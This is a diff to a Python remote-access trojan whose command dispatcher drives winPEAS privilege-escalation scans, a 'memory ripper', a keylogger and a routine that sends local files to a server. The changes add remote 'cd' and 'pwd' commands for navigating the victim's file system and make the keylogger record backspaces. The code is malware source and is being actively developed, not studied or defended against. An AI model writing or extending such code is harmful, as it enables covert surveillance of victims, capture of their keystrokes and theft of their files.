@@ -287,6 +287,10 @@ def filterCommand(command):
         winPEAS(False)
     elif command == "winpeas force":
         winPEAS(True)
+    elif "cd " in command:
+        changeCurrentPath(command.split(" ")[1])
+    elif command == "pwd":
+        send(currentDir())
 
     #MEMORY RIPPER    
     elif command == "memory ripper":
@@ -322,6 +326,8 @@ def kLogger():
             formattedKey = " "
         elif key == "enter":
             formattedKey = "\n"
+        elif key == "backspace" or key == "retroceso":
+            formattedKey = " <- "
         else:
             formattedKey = key
             
@@ -341,6 +347,19 @@ def kLogger():
         except Exception as e:
             logEvents(e)
 
+# DIRECTORY MOVEMENT AT EJECUTION TIME            
+
+def currentDir():
+    return os.getcwd()
+
+
+def changeCurrentPath(newPath):
+    try:
+        os.chdir(newPath)
+    except Exception as e:
+        logEvents(e)
+   
+    
 # SENDS A LOCAL FILE TO THE SERVER
 def sendFileByteMode(file):
     global stop
